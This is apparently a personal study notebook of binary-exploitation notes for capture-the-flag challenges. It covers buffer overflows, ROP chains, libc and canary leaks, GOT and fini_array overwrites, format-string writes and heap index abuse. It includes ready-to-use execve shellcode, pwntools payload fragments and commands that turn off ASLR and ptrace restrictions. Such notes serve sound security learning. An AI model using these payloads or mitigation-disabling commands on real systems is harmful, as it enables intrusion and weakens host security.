echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope

Try to find another writeup to know another solution

rbp-0x30 destination address of input
rbp-0x1c target address
so we need 0x30-0x1c for junk then value we need to write

overwrite variable used for argument in puts to print what we want

overwrite specifier in scanf to make us can input more payload ( example the specifier saved in variable )

we can recvuntil one line before the input too

32 bit = 4 byte
64 bit = 8 byte

patchelf

64bit shellcode
\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05

32bit shellcode
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

ASLR - VMMAP
while the addresses in a memory space will change, the offset between the addresses themselves will not change.So if we leak a single address from a memory region that we know what is, we can just add the offset to whatever address we want to know

PIE
Position Independent Executable (pie) is another binary mitigation extremely similar to aslr. It is basically aslr but for the actual binary's code / memory regions.
gef➤  pie b *0x116f
gef➤  pie run

Nx is short-hand for Non-Executable stack. What this means is that the stack region of memory is not executable. 
Enabled
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
Disabled
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
Error when running instructioon on stack (SIGSEV)

RELRO
Relro (Read only Relocation) affects the memory permissions similar to NX. The difference is whereas with NX it makes the stack executable, RELRO makes certain things read only so we can't write to them. 
The most common way I've seen this be an obstacle is preventing us from doing a got table overwrite.
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
  0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
  0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
  
search-pattern 0x13290b34 // searching value
knowing return address (rip) from info frame command

integer = 4 bytes
execve syscalls
rax:  0x3b              Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ 

mov qword ptr [rax], rdx ; ret // writing rdx to any memory in rax

write to where , search for null value in address
add 4 bytes or integer as payload can see in 07-static-bkp
0x0068732f6e69622f // /bin/sh

if cannot set breakpoint , try to set follow-fork-mode child
finish , exit from function
bt (backtrace) . A backtrace is a summary of how your program got where it is. It shows one line per frame, for many frames, starting with the currently executing frame (frame zero), followed by its caller (frame one), and on up the stack. ( see address function called ). knowing function called using r then ctrl+c then bt

payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
payload += p32(0x0)            # ecx value
payload += p32(0x80eb928)    # ebx value
32 bit
eax <- System Call Number
ebx <- First Argument
ecx <- Second Argument
edx <- Third Argument
	mov eax, 11
	mov ebx, str
	mov ecx, 0
	mov edx, 0
	int 0x80
https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/03/30/return-oriented-programming-part2.html

Canary
For the canary it will have 4 bytes, one null byte and three random bytes (so only three bytes that we don't know).

input will be reversed in stack, eg :ABCD will be DCBA in stack
u32 ( convert string payload to int )

knowing bss address -> info file

/bin = 0x6e69622f
/sh = 0x0068732f

try to use ROP function to get gadget

input 15935728
search-pattern 15935728

ROPgadget return 
pop rax ; ret

64 bit
: mov qword ptr \[rax\]
32 bit
: mov dword ptr \[eax\]

we can use syscall or int 0x80

one gadget to get shell

some binary cannot attached, like baby boi csaw19 ( bof dynnamic )
knowing function address , libc.symbols['system']
find string in libc libc.search('/bin/sh')

lsb = least significant byte (last byte)
leak canary with puts, store input until lsb of canary ( puts will print all input and canary )

 The GOT table is a section of memory in the elf that holds various libc addresses.It does this so the binary knows where it can find those addresses, since it doesn't know what they will be when it compiles. Since PIE is disabled, the GOT entry addresses aren't randomized and we know what they are. So if we were to pass the GOT entry address for puts to puts (which we can call since it is an imported function, meaning it is compiled into the binary, and we know it's address because there is no pie) we will get the libc address of puts.
 
 The plt address of puts (address of the imported function which we will use to call it), the address of the got entry of puts (holds the libc address), and a rop gadget to pop the got entry into the rdi register, and then return. 
 plt address = elf.symbols['puts']
 got address = elf.got['puts']
 
leak libc using puts.got and gets.got , search in https://libc.blukat.me/.
32 bit payload = [140 bytes buffer] + [puts()] + [main()] + [puts@got] // leak puts libc address (puts.got) using puts then back to main

canary usually in rbp-8 for 64bit and rbp-4 for 32 bit

puts(&buf); //leak canary with puts
send make leak canary wrong ( svc ) ( different sendline and send ) , in case using read
gdb show canary

next(libc.search("/bin/sh"))
puts got to leak is puts got from elf, but when puts got leaked , puts leak subtract with puts libc (libc.symbols['puts'])
assign libc base with libc.address

libc.sym == libc.symbols
rop = ROP(elf) // executable
(rop.find_gadget(['pop rdi', 'ret'])[0])

send payload as float ( fb19_overfloat )
float 4 byte

libc base , first address in libc vmmap

if segvault try to attach gdb then examine if the output is process 62485 is executing new program: /usr/bin/dash

we can jump to any instruction in function , if there is pop rbp in frame ,we need to add 8 byte junk to payload as rbp then next instruction

leak got with write instruction, set rdi to 1 (stdout) , set rdx to >= 8 ( to leak address ), set rsi to address to leak

rsp in ret is next instruction

disable aslr make it the rbp value wrong, so you need to enable it ( static address for rbp )

if you need to debug you can do gdb.attach(r) and do breakpoint on new terminal

p printf -> printf got ( check if got leak true , debug it then p function )

if there is pop rbp we need to fill 8 byte junk to payload, so the 8 byte junk will be popped

sometimes we need to recvuntil string that popped out before our input , just to get the right value for our leak ( sendline then recvuntil or we can just do same as usual )

leak puts and gets got in 32bit
payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["puts"])
payload += p32(elf.got["puts"])
payload += p32(elf.got["gets"])

leak puts got then go to vuln function
payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["vuln"])
payload += p32(elf.got["puts"])

we can pass our payload from binary using ./target | ./payload

write address of target function to got of called function to make the target function called
find got entry from function 

objdump -R 32_new | grep fflush
knowing value for n byte written in target got : break after printf function then view value written in got address , x/2w got_address
got = 0804a028
value on got = 0x8704870b
0804a028 = 0x0b
0804a029 = 0x87
and etc

if flag loaded in memory we can leak it using printf , %1$s . Using try catch to make a loop using that payload

write value to memory using printf
address = p32(fflush_got)
address += p32(fflush_got+1)
address += p32(fflush_got+2)
address += p32(fflush_got+3)
payload = address
payload += "%181x%10$n"
payload += "%124x%11$n"
payload += "%125x%12$n"
payload += "%260x%13$n"

%10 because when inputing AAAA.%x.%x , the value of AAAA in index 10 ( AAAA.8048914.ffcc7748.f7f32d50.f7f32400.f7f44e56.1.ffcc79f4.f7b4e2cc.39c.41414141 )
then we need to take a look on fflush_got value after first rewrite . After that adjust value to make it fit the target. Or we can check the value first x/x fflush_got/


if our input doesn't fit in output ( AAAA.80487d0.ffcf9dec.0.0.0.0.6563694e.206f7420.7465656d.756f7920.4141202c.252e4141.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825 ) . We need to do padding  ( BBAAAA.80487d0.ffb0450c.0.0.0.0.6563694e.206f7420.7465656d.756f7920.4242202c.41414141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e )

Since RELRO isn't enabled, we can write to the GOT table (the GOT Table is a table of addresses in the binary that hold libc address functions), and since PIE isn't enabled we know the addresses of the GOT table.

objdump -D greeting | grep system

bypass stack chk fail : .fini_array -> contains an array of functions which are executed sometime after main returns . Find fini array using info file. then we can make return to the address we want after main function executed

We can overwrite strlen with system, because it is using same argument that is char and it is one of the best choice if there is no call to strlen in another function

strlen@GLIBC_2.0 == strlen@got.plt

overwrite got to target function or target plt

fini_array = 0x08049934
target = 0x08048614

fini_array -> 8614 -> %12$n
fini_array+2 -> 0804 -> %13$n

we can use payload like below if we need to overwrite %13 and %15 with same value
payload += "%33652x%13$n"
payload += "%15$n"

function that use string as argument ( we can overwrite it with system ) :
- atoi
- strlen
- strtok

32 bit , if we want to know value printed by %x in printf . break at printf call , then look at the $esp+0x4
value saved in executable can be used to leak PIE , substract the value with executable value in vmmap to know the offset
value saved in libc can be used to leak LIBC base , substract the value with libc value in vmmap to know the offset

patching dynamic loader to elf
patchelf --set-interpreter /tmp/ld-2.27.so ./test
LD_PRELOAD=./libc-2.27.so ./test
(gdb) set environment LD_PRELOAD ./libc-2.27.so

search-pattern our_input // to know where is our input stored

malloc automates allocating address next to the heap address generated before ( allocate additional heap chunks )
fgets(20) = store 19 byte input
fgets(18) = store 17 byte input
strtok(address,'\n') = replace newline with null byte
if we input 16 byte payload , so there is \n in byte 17, then it will be replaced by null byte then in byte 18 because it is fgets byte 18 will be null byte , so inputting 16 byte value will make two null bytes in the end of our input.

case ( fgets -> null byte in end and strtok )
malloc(4) = 3 byte input , 1 byte header?
heap alloc for index - 0 16 byte 
heap alloc for index - 1 16 byte
we can overwrite value for heap alloc index - 0 to merge it value with heap alloc index - 1 , example by overwrite it value with 16 byte payload then overwrite the null byte in index - 1 by overwrite heap index - 1

calculate printformat position
look at $esp at call printf
0xffffd020│+0x0000: 0xffffd06c -> our input
0xffffd024│+0x0004:
so the position is 0xffffd06c-0xffffd024 = 72 . 72/4 ( because of 4 bytes ) = 18 . so the position is 18+1 = 19

# Calculate the amount of bytes we need to print for the fmt string write
x = (system & 0xffff) - 8 // 8 because there is 8 byte before this
y = ((system & 0xffff0000) >> 16) - (system & 0xffff) // (system & 0xffff) because there is (system & 0xffff) bytes before this

noop[0:17] + noop[16:] -> because last byte in noop[0:17] will be null byte , so value in index 16 must be send again

if we cannot recvuntil(stuck) try to send it without recvuntil 
to check value of pie and libc base, gdb.attach(r) then vmmap then continue

knowing got value of address , x/x address.

see stack layout IDA = windows->stack of game
-00000210 var_210         dq 64 dup(?)
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C var_C           dd ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)

ebp after var_210 64 value + 16 byte

p/f 0x0804900a00000000 -> convert to float
doubles -> 8 byte. last 4 bytes stored first
canary -> to find canary

*len += &GLOBAL_OFFSET_TABLE_ - 134529023; // *len += 1
    
11-index/csaw18_doubletrouble
increment the length with value > -10 , then send value -10 > x > -100 to stop the increment and save the length that incremented. send junk then send shellcode , because there is sorted value we need to bypass the canary by providing right value that make it fit ( trial ).  
sorted ( descending ) value in float , 0xff > 0x00 , so the value in $ebp-0xn+1 must be greater than $ebp-0xn.
[*] find the best way to make the canary fit.

ret -> This is beneftitial to us, since all it will do is just continue to the next address and execute it, which will be the last 4 bytes of the next double

online x86/x64 decompiler/compiler 
https://defuse.ca/online-x86-assembler.htm

hex 8 byte to float = target.sendline("%.19g" % struct.unpack("<d", p64(ret)))

def pdouble(f):
    return struct.pack('<d', f)

def double_to_hex(f):
    return hex(struct.unpack('<Q', struct.pack('<d', f))[0])

def int_to_double(i):
    return struct.unpack('<d', p64(i))[0]

def hex_to_double(h):
    return struct.unpack('<d', h.decode("hex")[::-1])[0]
    
heartbleed
input more data to leak another data
flag in 0x6B7540
our input in 0x6B7340
so we need 0x6B7540-0x6B7340 = 0x200 = 512 byte to leak the flag
globals[v9] = 0; // we need to make v9 = 512 + x , to make it load all data
puts print start address until null byte

atof , we can use nan to bypass check greater than ,lower than, or equal

malloc return heap pointer	

variable HEAP_PTRS in bss adjacent with SIZES
read
 __isoc99_scanf("%d", &v1);
  if ( v1 <= INDEX )
  {
    v2 = HEAP_PTRS[v1];
    printf("%s", v2);
  }

add
__isoc99_scanf("%d", &v1);
buf = malloc(v1);
read(0, buf, v1);
HEAP_PTRS[INDEX] = (__int64)buf;
SIZES[INDEX++] = v1;

edit
__isoc99_scanf("%d", &v1)
buf = (void *)HEAP_PTRS[v1];
v2 = SIZES[v1];
read(0, buf, v2);
*((_BYTE *)buf + v2) = 0;

we can use read function to leak libc , becuase index can < 0 
__int64 HEAP_PTRS[8] -> 0x6020A0
__int SIZE -> 0x6020E0
so we can overlap HEAP_PTRS with SIZES , example
HEAP_PTRS[18] = 0x602130
SIZE[20] = 0x602130
so we need to write 20 values , then 20th write we need to make size[20] = got address , and size[21] = 0x0. 
Then we edit HEAP_PTRS[18] which is equal SIZE[21]+SIZE[20] , we change the value of GOT address to one_gadget or something

leak libc
because the read function read HEAP_PTRS[v1] , which is HEAP_PTRS value is pointer , so we need to find reference to GOT address (jmprel) .
heap_ptrs[0] = address_index->address_heap->heap_value // original
heap_ptrs[offset] = address_index->address_got->got_value // target

knowing jmp address
$var = p puts
$var2 = search-pattern $var // got address
search-pattern $var2 // jmp address / address_index that save address_got

address_index = 0x400538
( 0x400538 - 0x6020A0 )/ 8 = -263021

fail run system swampctf19_dreamheaps but successfully exploited , try another solution

we can overwrite free got , then do delete on index that save /bin/sh
